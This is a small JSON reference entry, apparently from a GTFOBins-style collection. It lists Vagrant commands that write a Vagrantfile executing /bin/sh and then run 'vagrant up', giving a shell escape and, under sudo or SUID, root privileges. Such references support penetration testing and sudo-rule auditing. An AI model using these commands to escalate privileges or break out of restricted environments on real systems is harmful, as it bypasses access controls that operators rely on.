{
  "functions": {
    "shell": [
      {
        
        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
      }
    ],
    "sudo": [
      {
        
        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
      }
    ],
    "suid": [
      {
        
        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
      }
    ]
  }
}
